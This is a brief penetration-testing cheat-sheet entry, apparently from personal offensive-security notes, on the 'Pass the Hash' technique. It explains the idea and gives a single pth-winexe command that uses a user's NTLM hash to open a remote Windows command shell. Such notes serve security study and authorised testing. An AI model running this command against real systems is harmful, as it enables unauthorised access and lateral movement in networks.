# Pass the Hash

> Allows us to authenticate to a remote system or service using the NTLM hash of a user (will not work for Kerberos authentication).

 ```bash
#From our kali machine:
pth-winexe -U $USER%$NTLMHASH //$IPADDRESS cmd
#Change $IPADDRESS to the remote machine.
 ```

**Note:** This method only works for AD domain accounts and the built-in local administrator account.
